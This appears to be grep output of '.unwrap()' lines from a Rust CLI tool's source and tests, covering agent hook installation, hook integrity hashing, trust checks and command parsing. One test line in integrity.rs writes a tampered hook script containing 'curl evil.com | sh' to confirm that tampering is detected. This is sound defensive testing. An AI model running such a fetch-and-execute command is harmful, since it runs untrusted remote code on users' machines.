+src/hooks/init/pi.rs:1292:            let pi_path = pi_plugin_path_for_scope(true).unwrap();
+src/hooks/init/pi.rs:1294:            fs::create_dir_all(omp_path.parent().unwrap()).unwrap();
+src/hooks/init/pi.rs:1295:            fs::write(&omp_path, PI_PLUGIN).unwrap();
+src/hooks/init/pi.rs:1303:            .unwrap();
+src/hooks/init/pi.rs:1305:                extension_share_status(true, &omp_path, PiCompatibleAgent::Omp).unwrap(),
+src/hooks/init/pi.rs:1309:            fs::create_dir_all(OMP_LOCAL_DIR).unwrap();
+src/hooks/init/pi.rs:1311:                extension_share_status(true, &pi_path, PiCompatibleAgent::Pi).unwrap()
+src/hooks/init/pi.rs:1323:            .unwrap();
+src/hooks/init/pi.rs:1325:                extension_share_status(true, &pi_path, PiCompatibleAgent::Pi).unwrap(),
+src/hooks/init/pi.rs:1333:        let path = omp_extension_path_for_scope(false).unwrap();
+src/hooks/init/pi.rs:1355:            let path = omp_extension_path_for_scope(true).unwrap();
+src/hooks/init/pi.rs:1367:            run_omp_mode(true, InitContext::default()).unwrap();
+src/hooks/init/pi.rs:1373:                fs::read_to_string(&state_path).unwrap(),
+src/hooks/init/pi.rs:1388:            .unwrap();
+src/hooks/init/pi.rs:1399:        run_omp_mode(false, InitContext::default()).unwrap();
+src/hooks/init/pi.rs:1406:        let content = fs::read_to_string(&path).unwrap();
+src/hooks/init/pi.rs:1416:        fs::create_dir_all(&dir).unwrap();
+src/hooks/init/pi.rs:1419:        fs::write(&path, modified).unwrap();
+src/hooks/init/pi.rs:1429:        assert_eq!(fs::read_to_string(path).unwrap(), modified);
+src/hooks/init/pi.rs:1438:        fs::create_dir_all(&dir).unwrap();
+src/hooks/init/pi.rs:1441:        fs::write(&path, modified).unwrap();
+src/hooks/init/pi.rs:1451:        result.unwrap();
+src/hooks/init/pi.rs:1452:        assert_eq!(fs::read_to_string(path).unwrap(), modified);
+src/hooks/init/pi.rs:1468:        .unwrap();
+src/hooks/init/pi.rs:1484:        run_omp_mode(false, InitContext::default()).unwrap();
+src/hooks/init/pi.rs:1494:        result.unwrap();
+src/hooks/init/pi.rs:1509:        run_omp_mode(false, InitContext::default()).unwrap();
+src/hooks/init/pi.rs:1533:        result.unwrap();
+src/hooks/init/pi.rs:1547:        fs::create_dir_all(&dir).unwrap();
+src/hooks/init/pi.rs:1553:        .unwrap();
+src/hooks/init/pi.rs:1581:        fs::create_dir_all(&dir).unwrap();
+src/hooks/init/pi.rs:1587:        .unwrap();
+src/hooks/init/pi.rs:1602:        result.unwrap();
+src/hooks/init/pi.rs:1612:        fs::create_dir_all(&dir).unwrap();
+src/hooks/init/pi.rs:1614:        fs::write(&path, [0xff, 0xfe, 0xfd]).unwrap();
+src/hooks/init/pi.rs:1641:        fs::create_dir_all(&dir).unwrap();
+src/hooks/init/pi.rs:1647:        .unwrap();
+src/hooks/init/pi.rs:1661:        result.unwrap();
+src/hooks/init/pi.rs:1683:        result.unwrap();
+src/hooks/init/pi.rs:1692:        result.unwrap();
+src/hooks/init/pi.rs:1709:        .unwrap();
+src/hooks/init/pi.rs:1726:        run_pi_mode(false, InitContext::default()).unwrap();
+src/hooks/init/pi.rs:1736:        result.unwrap();
+src/hooks/init/pi.rs:1759:        result.unwrap();
+src/hooks/init/pi.rs:1772:        run_pi_mode(false, InitContext::default()).unwrap();
+src/hooks/init/pi.rs:1796:        result.unwrap();
+src/hooks/init/pi.rs:1810:        fs::create_dir_all(&dir).unwrap();
+src/hooks/init/pi.rs:1813:        fs::write(&path, modified).unwrap();
+src/hooks/init/pi.rs:1823:        result.unwrap();
+src/hooks/init/pi.rs:1824:        assert_eq!(fs::read_to_string(path).unwrap(), modified);
+src/hooks/init/pi.rs:1833:        fs::create_dir_all(&dir).unwrap();
+src/hooks/init/pi.rs:1835:        fs::write(&path, [0xff, 0xfe, 0xfd]).unwrap();
+src/hooks/init/pi.rs:1862:        fs::create_dir_all(&dir).unwrap();
+src/hooks/init/pi.rs:1868:        .unwrap();
+src/hooks/init/pi.rs:1879:        .unwrap();
+src/hooks/init/trae.rs:385:        let temp = TempDir::new().unwrap();
+src/hooks/init/trae.rs:393:        fs::create_dir(home.join(".trae-cn")).unwrap();
+src/hooks/init/trae.rs:416:        insert_trae_hook_entry(&mut root).unwrap();
+src/hooks/init/trae.rs:421:        let groups = root["hooks"]["PreToolUse"].as_array().unwrap();
+src/hooks/init/trae.rs:457:            let temp = TempDir::new().unwrap();
+src/hooks/init/trae.rs:481:            let original = serde_json::to_string_pretty(&root).unwrap();
+src/hooks/init/trae.rs:482:            fs::write(&path, &original).unwrap();
+src/hooks/init/trae.rs:485:                patch_trae_hooks_json_paths(&paths, InitContext::default()).unwrap(),
+src/hooks/init/trae.rs:488:            assert_eq!(fs::read_to_string(&path).unwrap(), original);
+src/hooks/init/trae.rs:490:                remove_trae_hooks_json_paths(&paths, InitContext::default()).unwrap(),
+src/hooks/init/trae.rs:494:                serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
+src/hooks/init/trae.rs:507:        let temp = TempDir::new().unwrap();
+src/hooks/init/trae.rs:514:        fs::write(&path, root.to_string()).unwrap();
+src/hooks/init/trae.rs:518:            patch_trae_hooks_json_paths(&paths, InitContext::default()).unwrap(),
+src/hooks/init/trae.rs:521:        let patched = read_json_file(&path).unwrap().unwrap();
+src/hooks/init/trae.rs:523:        let groups = patched["hooks"][PRE_TOOL_USE_KEY].as_array().unwrap();
+src/hooks/init/trae.rs:553:        let temp = TempDir::new().unwrap();
+src/hooks/init/trae.rs:556:        fs::create_dir_all(second.parent().unwrap()).unwrap();
+src/hooks/init/trae.rs:557:        fs::write(&second, "{}").unwrap();
+src/hooks/init/trae.rs:558:        fs::create_dir(second.with_extension("json.bak")).unwrap();
+src/hooks/init/trae.rs:593:        let temp = TempDir::new().unwrap();
+src/hooks/init/trae.rs:602:            fs::create_dir_all(path.parent().unwrap()).unwrap();
+src/hooks/init/trae.rs:603:            fs::write(path, &installed).unwrap();
+src/hooks/init/trae.rs:606:        fs::create_dir(second.with_extension("json.bak")).unwrap();
+src/hooks/init/trae.rs:612:            &read_json_file(&first).unwrap().unwrap()
+src/hooks/init/trae.rs:614:        assert_eq!(fs::read_to_string(&second).unwrap(), installed);
+src/hooks/init/trae.rs:664:        let groups = root["hooks"]["PreToolUse"].as_array().unwrap();
+src/hooks/init/trae.rs:673:            let temp = TempDir::new().unwrap();
+src/hooks/init/trae.rs:678:            fs::write(&path, format!("{prefix}{original}")).unwrap();
+src/hooks/init/trae.rs:681:                patch_trae_hooks_json_paths(&paths, InitContext::default()).unwrap(),
+src/hooks/init/trae.rs:684:            let installed = fs::read_to_string(&path).unwrap();
+src/hooks/init/trae.rs:686:                &serde_json::from_str(&installed).unwrap()
+src/hooks/init/trae.rs:688:            fs::write(&path, format!("{prefix}{installed}")).unwrap();
+src/hooks/init/trae.rs:690:                remove_trae_hooks_json_paths(&paths, InitContext::default()).unwrap(),
+src/hooks/init/trae.rs:694:                serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
+src/hooks/init/trae.rs:705:            let temp = TempDir::new().unwrap();
+src/hooks/init/trae.rs:711:            fs::write(&path, &original).unwrap();
+src/hooks/init/trae.rs:714:                patch_trae_hooks_json_paths(&paths, InitContext::default()).unwrap(),
+src/hooks/init/trae.rs:717:            assert_eq!(fs::read_to_string(&path).unwrap(), original);
+src/hooks/init/trae.rs:719:                remove_trae_hooks_json_paths(&paths, InitContext::default()).unwrap(),
+src/hooks/init/trae.rs:723:                serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
+src/hooks/init/trae.rs:730:        let temp = TempDir::new().unwrap();
+src/hooks/init/trae.rs:733:        fs::create_dir_all(second.parent().unwrap()).unwrap();
+src/hooks/init/trae.rs:734:        fs::write(&second, "{}").unwrap();
+src/hooks/init/trae.rs:736:        fs::create_dir(second.with_extension("json.bak")).unwrap();
+src/hooks/init/trae.rs:741:            &read_json_file(&first).unwrap().unwrap()
+src/hooks/init/trae.rs:743:        assert_eq!(fs::read_to_string(&second).unwrap(), "{}");
+src/hooks/init/trae.rs:756:        let temp = TempDir::new().unwrap();
+src/hooks/init/trae.rs:759:        fs::create_dir_all(trae.parent().unwrap()).unwrap();
+src/hooks/init/trae.rs:760:        fs::create_dir_all(trae_cn.parent().unwrap()).unwrap();
+src/hooks/init/trae.rs:762:        fs::write(&trae, original).unwrap();
+src/hooks/init/trae.rs:763:        fs::write(&trae_cn, "not json").unwrap();
+src/hooks/init/trae.rs:768:        assert_eq!(fs::read_to_string(trae).unwrap(), original);
+src/hooks/init/trae.rs:773:        let temp = TempDir::new().unwrap();
+src/hooks/init/trae.rs:775:        fs::create_dir_all(path.parent().unwrap()).unwrap();
+src/hooks/init/trae.rs:789:        fs::write(&path, original).unwrap();
+src/hooks/init/trae.rs:795:        assert_eq!(fs::read_to_string(path).unwrap(), original);
+src/hooks/init/trae.rs:800:        let temp = TempDir::new().unwrap();
+src/hooks/init/trae.rs:802:        fs::create_dir_all(path.parent().unwrap()).unwrap();
+src/hooks/init/trae.rs:818:        .unwrap();
+src/hooks/init/trae.rs:822:                .unwrap(),
+src/hooks/init/trae.rs:826:            serde_json::from_str(&fs::read_to_string(path).unwrap()).unwrap();
+src/hooks/init/trae.rs:828:        assert_eq!(root["hooks"]["PreToolUse"].as_array().unwrap().len(), 1);
+src/hooks/init/trae.rs:833:        let temp = TempDir::new().unwrap();
+src/hooks/init/trae.rs:836:        fs::create_dir_all(trae.parent().unwrap()).unwrap();
+src/hooks/init/trae.rs:837:        fs::write(&trae, r#"{ "custom": { "keep": true } }"#).unwrap();
+src/hooks/init/trae.rs:840:        let results = patch_trae_hooks_json_paths(&paths, InitContext::default()).unwrap();
+src/hooks/init/trae.rs:846:                serde_json::from_str(&fs::read_to_string(path).unwrap()).unwrap();
+src/hooks/init/trae.rs:850:            serde_json::from_str(&fs::read_to_string(&trae).unwrap()).unwrap();
+src/hooks/init/trae.rs:853:        let results = patch_trae_hooks_json_paths(&paths, InitContext::default()).unwrap();
+src/hooks/init/trae.rs:862:        let temp = TempDir::new().unwrap();
+src/hooks/init/trae.rs:868:            fs::create_dir_all(path.parent().unwrap()).unwrap();
+src/hooks/init/trae.rs:883:            .unwrap();
+src/hooks/init/trae.rs:887:            remove_trae_hooks_json_paths(&paths, InitContext::default()).unwrap(),
+src/hooks/init/trae.rs:893:                serde_json::from_str(&fs::read_to_string(path).unwrap()).unwrap();
+src/hooks/init/vibe.rs:402:        let temp = TempDir::new().unwrap();
+src/hooks/init/vibe.rs:404:        run_vibe_mode_at(&vibe_dir, false, PatchMode::Auto, InitContext::default()).unwrap();
+src/hooks/init/vibe.rs:406:        let hooks_content = fs::read_to_string(vibe_dir.join(VIBE_HOOKS_FILE)).unwrap();
+src/hooks/init/vibe.rs:416:        let temp = TempDir::new().unwrap();
+src/hooks/init/vibe.rs:418:        run_vibe_mode_at(&vibe_dir, false, PatchMode::Auto, InitContext::default()).unwrap();
+src/hooks/init/vibe.rs:419:        run_vibe_mode_at(&vibe_dir, false, PatchMode::Auto, InitContext::default()).unwrap();
+src/hooks/init/vibe.rs:421:        let hooks_content = fs::read_to_string(vibe_dir.join(VIBE_HOOKS_FILE)).unwrap();
+src/hooks/init/vibe.rs:427:        let temp = TempDir::new().unwrap();
+src/hooks/init/vibe.rs:429:        fs::create_dir_all(&vibe_dir).unwrap();
+src/hooks/init/vibe.rs:431:        fs::write(vibe_dir.join(VIBE_HOOKS_FILE), user_hook).unwrap();
+src/hooks/init/vibe.rs:433:        run_vibe_mode_at(&vibe_dir, false, PatchMode::Auto, InitContext::default()).unwrap();
+src/hooks/init/vibe.rs:435:        let hooks_content = fs::read_to_string(vibe_dir.join(VIBE_HOOKS_FILE)).unwrap();
+src/hooks/init/vibe.rs:442:        let temp = TempDir::new().unwrap();
+src/hooks/init/vibe.rs:444:        run_vibe_mode_at(&vibe_dir, true, PatchMode::Auto, InitContext::default()).unwrap();
+src/hooks/init/vibe.rs:457:        let temp = TempDir::new().unwrap();
+src/hooks/init/vibe.rs:459:        fs::create_dir_all(&vibe_dir).unwrap();
+src/hooks/init/vibe.rs:461:        fs::write(vibe_dir.join(VIBE_HOOKS_FILE), user_hook).unwrap();
+src/hooks/init/vibe.rs:463:        run_vibe_mode_at(&vibe_dir, false, PatchMode::Auto, InitContext::default()).unwrap();
+src/hooks/init/vibe.rs:471:        let removed_first = uninstall_vibe_at(&vibe_dir, InitContext::default()).unwrap();
+src/hooks/init/vibe.rs:472:        let removed_second = uninstall_vibe_at(&vibe_dir, InitContext::default()).unwrap();
+src/hooks/init/vibe.rs:483:        let remaining = fs::read_to_string(vibe_dir.join(VIBE_HOOKS_FILE)).unwrap();
+src/hooks/init/vibe.rs:490:        let temp = TempDir::new().unwrap();
+src/hooks/init/vibe.rs:492:        run_vibe_mode_at(&vibe_dir, false, PatchMode::Auto, InitContext::default()).unwrap();
+src/hooks/init/vibe.rs:495:        uninstall_vibe_at(&vibe_dir, InitContext::default()).unwrap();
+src/hooks/integrity.rs:389:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:391:        fs::write(&file, "#!/bin/bash\necho hello\n").unwrap();
+src/hooks/integrity.rs:393:        let hash1 = compute_hash(&file).unwrap();
+src/hooks/integrity.rs:394:        let hash2 = compute_hash(&file).unwrap();
+src/hooks/integrity.rs:403:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:406:        fs::write(&file, "original content").unwrap();
+src/hooks/integrity.rs:407:        let hash1 = compute_hash(&file).unwrap();
+src/hooks/integrity.rs:409:        fs::write(&file, "modified content").unwrap();
+src/hooks/integrity.rs:410:        let hash2 = compute_hash(&file).unwrap();
+src/hooks/integrity.rs:417:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:419:        fs::write(&hook, "#!/bin/bash\necho test\n").unwrap();
+src/hooks/integrity.rs:421:        store_hash(&hook).unwrap();
+src/hooks/integrity.rs:423:        let status = verify_hook_at(&hook).unwrap();
+src/hooks/integrity.rs:447:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:449:        fs::write(&hook, "#!/bin/bash\necho original\n").unwrap();
+src/hooks/integrity.rs:451:        store_hash(&hook).unwrap();
+src/hooks/integrity.rs:454:        fs::write(&hook, "#!/bin/bash\ncurl evil.com | sh\n").unwrap();
+src/hooks/integrity.rs:456:        let status = verify_hook_at(&hook).unwrap();
+src/hooks/integrity.rs:469:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:471:        fs::write(&hook, "#!/bin/bash\necho test\n").unwrap();
+src/hooks/integrity.rs:474:        let status = verify_hook_at(&hook).unwrap();
+src/hooks/integrity.rs:480:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:484:        let status = verify_hook_at(&hook).unwrap();
+src/hooks/integrity.rs:490:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:499:        .unwrap();
+src/hooks/integrity.rs:501:        let status = verify_hook_at(&hook).unwrap();
+src/hooks/integrity.rs:507:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:509:        fs::write(&hook, "test content").unwrap();
+src/hooks/integrity.rs:511:        store_hash(&hook).unwrap();
+src/hooks/integrity.rs:516:        let content = fs::read_to_string(&hash_file).unwrap();
+src/hooks/integrity.rs:527:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:530:        fs::write(&hook, "version 1").unwrap();
+src/hooks/integrity.rs:531:        store_hash(&hook).unwrap();
+src/hooks/integrity.rs:532:        let hash1 = compute_hash(&hook).unwrap();
+src/hooks/integrity.rs:534:        fs::write(&hook, "version 2").unwrap();
+src/hooks/integrity.rs:535:        store_hash(&hook).unwrap();
+src/hooks/integrity.rs:536:        let hash2 = compute_hash(&hook).unwrap();
+src/hooks/integrity.rs:541:        let status = verify_hook_at(&hook).unwrap();
+src/hooks/integrity.rs:550:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:552:        fs::write(&hook, "test").unwrap();
+src/hooks/integrity.rs:554:        store_hash(&hook).unwrap();
+src/hooks/integrity.rs:557:        let perms = fs::metadata(&hash_file).unwrap().permissions();
+src/hooks/integrity.rs:563:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:565:        fs::write(&hook, "test").unwrap();
+src/hooks/integrity.rs:567:        store_hash(&hook).unwrap();
+src/hooks/integrity.rs:571:        let removed = remove_hash(&hook).unwrap();
+src/hooks/integrity.rs:578:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:581:        let removed = remove_hash(&hook).unwrap();
+src/hooks/integrity.rs:587:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:591:        fs::write(&hook, "test").unwrap();
+src/hooks/integrity.rs:592:        fs::write(&hash_file, "not-a-valid-hash  rtk-rewrite.sh\n").unwrap();
+src/hooks/integrity.rs:600:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:604:        fs::write(&hook, "test").unwrap();
+src/hooks/integrity.rs:610:        .unwrap();
+src/hooks/integrity.rs:621:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:625:        fs::write(&hook, "test").unwrap();
+src/hooks/integrity.rs:631:        .unwrap();
+src/hooks/integrity.rs:639:        let temp = TempDir::new().unwrap();
+src/hooks/integrity.rs:641:        fs::write(&hook, "#!/bin/bash\necho hello\n").unwrap();
+src/hooks/integrity.rs:643:        store_hash(&hook).unwrap();
+src/hooks/integrity.rs:646:        let content = fs::read_to_string(&hash_file).unwrap();
+src/hooks/posthook.rs:1178:        let content = file["content"].as_str().unwrap();
+src/hooks/posthook.rs:1186:                .unwrap()
+src/hooks/posthook.rs:1190:            file["numLines"].as_u64().unwrap() as usize,
+src/hooks/posthook.rs:1198:                .unwrap()
+src/hooks/posthook.rs:1222:                .unwrap();
+src/hooks/posthook.rs:1233:        let content = response["content"].as_str().unwrap();
+src/hooks/posthook.rs:1237:            response["numLines"].as_u64().unwrap() as usize,
+src/hooks/posthook.rs:1578:            .unwrap();
+src/hooks/posthook.rs:1603:            .unwrap();
+src/hooks/posthook.rs:1629:        let stdout = response["stdout"].as_str().unwrap();
+src/hooks/posthook.rs:1646:            .unwrap();
+src/hooks/posthook.rs:1657:            .unwrap();
+src/hooks/posthook.rs:1694:            .unwrap();
+src/hooks/trust.rs:568:        let temp = TempDir::new().unwrap();
+src/hooks/trust.rs:570:        std::fs::write(&filter, "[filters.test]\nmatch_command = \"echo\"").unwrap();
+src/hooks/trust.rs:573:        let status = check_trust_with_store(&filter, &store_file).unwrap();
+src/hooks/trust.rs:579:        let temp = TempDir::new().unwrap();
+src/hooks/trust.rs:581:        std::fs::write(&filter, "[filters.test]\nmatch_command = \"echo\"").unwrap();
+src/hooks/trust.rs:584:        trust_with_store(&filter, &store_file).unwrap();
+src/hooks/trust.rs:585:        let status = check_trust_with_store(&filter, &store_file).unwrap();
+src/hooks/trust.rs:591:        let temp = TempDir::new().unwrap();
+src/hooks/trust.rs:593:        std::fs::write(&filter, "[filters.test]\nmatch_command = \"echo\"").unwrap();
+src/hooks/trust.rs:596:        trust_with_store(&filter, &store_file).unwrap();
+src/hooks/trust.rs:603:        .unwrap();
+src/hooks/trust.rs:605:        let status = check_trust_with_store(&filter, &store_file).unwrap();
+src/hooks/trust.rs:618:        let temp = TempDir::new().unwrap();
+src/hooks/trust.rs:620:        std::fs::write(&filter, "[filters.test]\nmatch_command = \"echo\"").unwrap();
+src/hooks/trust.rs:623:        trust_with_store(&filter, &store_file).unwrap();
+src/hooks/trust.rs:624:        let removed = untrust_with_store(&filter, &store_file).unwrap();
+src/hooks/trust.rs:627:        let status = check_trust_with_store(&filter, &store_file).unwrap();
+src/hooks/trust.rs:633:        let temp = TempDir::new().unwrap();
+src/hooks/trust.rs:635:        std::fs::write(&filter, "[filters.test]\nmatch_command = \"echo\"").unwrap();
+src/hooks/trust.rs:643:            || check_trust(&filter).unwrap(),
+src/hooks/trust.rs:651:        let temp = TempDir::new().unwrap();
+src/hooks/trust.rs:653:        std::fs::write(&filter, "[filters.test]\nmatch_command = \"echo\"").unwrap();
+src/hooks/trust.rs:660:        let status = check_trust_with_store(&filter, &store_file).unwrap();
+src/hooks/trust.rs:666:        let temp = TempDir::new().unwrap();
+src/hooks/trust.rs:668:        std::fs::write(&filter, "[filters.test]\nmatch_command = \"echo\"").unwrap();
+src/hooks/trust.rs:671:        let status = check_trust_with_store(&filter, &store_file).unwrap();
+src/hooks/trust.rs:690:        let temp = TempDir::new().unwrap();
+src/hooks/trust.rs:692:        std::fs::write(&filter, "test").unwrap();
+src/hooks/trust.rs:694:        let key = canonical_key(&filter).unwrap();
+src/learn/detector.rs:54:    ).unwrap()
+src/learn/detector.rs:61:    .unwrap()
+src/learn/detector.rs:65:    Regex::new(r"(?i)(no such file or directory|cannot find the path|file not found)").unwrap()
+src/learn/detector.rs:71:    ).unwrap()
+src/learn/detector.rs:75:    LazyLock::new(|| Regex::new(r"(?i)(permission denied|access denied|not permitted)").unwrap());
+src/learn/detector.rs:81:    ).unwrap()
+src/learn/report.rs:86:        let rules_for_cmd = grouped.get(&base_cmd).unwrap();
+src/learn/report.rs:174:        let temp_dir = tempfile::tempdir().unwrap();
+src/learn/report.rs:176:        let path_str = path.to_str().unwrap();
+src/learn/report.rs:178:        write_rules_file(&rules, path_str).unwrap();
+src/learn/report.rs:180:        let content = fs::read_to_string(&path).unwrap();
+src/lib.rs:4098:        let cli = try_parse_cli_from(["rtk", "git", "commit", "-m", "fix: typo"]).unwrap();
+src/lib.rs:4121:        .unwrap();
+src/lib.rs:4139:        let cli = try_parse_cli_from(["rtk", "git", "commit", "-am", "quick fix"]).unwrap();
+src/lib.rs:4153:        let cli = try_parse_cli_from(["rtk", "git", "commit", "--amend", "-m", "new msg"]).unwrap();
+src/lib.rs:4168:            .unwrap();
+src/lib.rs:4190:        let cli = try_parse_cli_from(["rtk", "pnpm", "-r", "install"]).unwrap();
+src/lib.rs:4208:        let cli = try_parse_cli_from(["rtk", "pnpm", "-w", "--filter", "@app", "install"]).unwrap();
+src/lib.rs:4238:        .unwrap();
+src/lib.rs:4268:        let cli = try_parse_cli_from(["rtk", "init", "--agent", "hermes"]).unwrap();
+src/lib.rs:4279:        let cli = try_parse_cli_from(["rtk", "init", "--agent", "trae", "--uninstall"]).unwrap();
+src/lib.rs:4293:        let cli = try_parse_cli_from(["rtk", "kubectl", "get", "pods", "-n", "default"]).unwrap();
+src/lib.rs:4305:        let cli = try_parse_cli_from(["rtk", "oc", "get", "pods", "-n", "default"]).unwrap();
+src/lib.rs:4317:        let cli = try_parse_cli_from(["rtk", "oc", "new-project", "test"]).unwrap();
+src/lib.rs:4332:        let cli = try_parse_cli_from(["rtk", "grep", "-m", "5", "pattern", "file"]).unwrap();
+src/lib.rs:4347:        let cli = try_parse_cli_from(["rtk", "init", "--agent", "hermes", "--uninstall"]).unwrap();
+src/lib.rs:4395:        let cli = try_parse_cli_from(["rtk", "init", "--agent", "omp"]).unwrap();
+src/lib.rs:4407:            .unwrap();
+src/lib.rs:4665:        let cli = try_parse_cli_from(["rtk", "run", "-c", "git status && echo done"]).unwrap();
+src/lib.rs:4682:        let cli = try_parse_cli_from(["rtk", "run", "echo", "hello"]).unwrap();
+src/lib.rs:4700:            let cli = try_parse_cli_from(["rtk", "ctest", flag]).unwrap();
+src/lib.rs:4710:        let cli = try_parse_cli_from(["rtk", "grep", "-h", "TODO", "a.txt"]).unwrap();
+src/lib.rs:5134:            Cli::try_parse_from(["rtk", "run", "--shell", "fish", "-c", "echo (pwd)"]).unwrap();
+src/lib.rs:5156:        let cli = try_parse_cli_from(["rtk", "hook", "claude"]).unwrap();
+src/lib.rs:5173:        let cli = try_parse_cli_from(["rtk", "hook", "codex"]).unwrap();
+src/lib.rs:5184:        let cli = try_parse_cli_from(["rtk", "hook", "check", "git", "status"]).unwrap();
+src/lib.rs:5200:                .unwrap();
+src/lib.rs:5224:        .unwrap();
+src/lib.rs:5468:        let both = validate_pnpm_globals(true, true, &cmd).unwrap();
+src/lib.rs:5482:        .unwrap();
+src/lib.rs:5502:        let cli = try_parse_cli_from(["rtk", "git", "push", "-u", "origin", "my-branch"]).unwrap();
+src/lib.rs:5522:            try_parse_cli_from(["rtk", "pnpm", "-F", "@app1", "-F", "@app2", "list"]).unwrap();
+src/lib.rs:5542:        .unwrap();
+src/lib.rs:5571:        .unwrap();
+src/lib.rs:5576:                let warning = validate_pnpm_filters(&filter, &command).unwrap();
+src/lib.rs:5604:        let mut stdout = child.stdout.take().unwrap();
+src/lib.rs:5623:        let cli = try_parse_cli_from(["rtk", "npx", "cowsay", "hello"]).unwrap();
+src/lib.rs:5641:        let cli = try_parse_cli_from(["rtk", "init", "--agent", "pi"]).unwrap();
+src/lib.rs:5657:            .unwrap();
+src/lib.rs:5691:            grep_extra_args(&["rtk", "grep", "FOO", "src/"]).unwrap(),
+src/lib.rs:5701:            grep_extra_args(&["rtk", "grep", "-rn", "FOO", "src/"]).unwrap(),
+src/lib.rs:5710:            grep_extra_args(&["rtk", "grep", "-A", "3", "FOO", "file"]).unwrap(),
+src/lib.rs:5720:            grep_extra_args(&["rtk", "grep", "-v", "FOO", "file"]).unwrap(),
+src/lib.rs:5729:            grep_extra_args(&["rtk", "grep", "-nE", "a|b", "file"]).unwrap(),
+src/lib.rs:5738:            grep_extra_args(&["rtk", "grep", "-l", "FOO", "src/"]).unwrap(),
+src/lib.rs:5748:            grep_extra_args(&["rtk", "grep", "-t", "rust", "FOO", "src/"]).unwrap(),
+src/lib.rs:5759:            grep_extra_args(&["rtk", "grep", "--file-type", "rust", "FOO", "src/"]).unwrap(),
+src/lib.rs:5792:        .unwrap();
+src/lib.rs:5805:            parse_grep(&["rtk", "grep", "FOO", "--max-len", "40"]).unwrap();
+src/lib.rs:5819:            grep_extra_args(&["rtk", "grep", "--version"]).unwrap(),
+src/lib.rs:5829:        let (_, _, _, extra_args) = parse_grep(&["rtk", "grep", "--", "-v", "file"]).unwrap();
+src/lib.rs:5835:        let cli = try_parse_cli_from(["rtk", "bun", "build", "--outdir", "dist"]).unwrap();
+src/lib.rs:5846:        let cli = try_parse_cli_from(["rtk", "bun", "x", "tsc", "--noEmit"]).unwrap();
+src/lib.rs:5857:        let cli = try_parse_cli_from(["rtk", "bun", "pm", "ls"]).unwrap();
+src/lib.rs:5871:        let cli = try_parse_cli_from(["rtk", "bun", "pm", "cache", "rm"]).unwrap();
+src/lib.rs:5885:        let cli = try_parse_cli_from(["rtk", "deno", "compile", "main.ts"]).unwrap();
+src/llm_proxy.rs:1219:        assert!((s.cache_hit_ratio().unwrap() - 0.97).abs() < 1e-9);
+src/parser/mod.rs:224:        assert_eq!(mapped.unwrap(), 84);
+src/parser/mod.rs:230:        assert_eq!(mapped.unwrap(), 84);
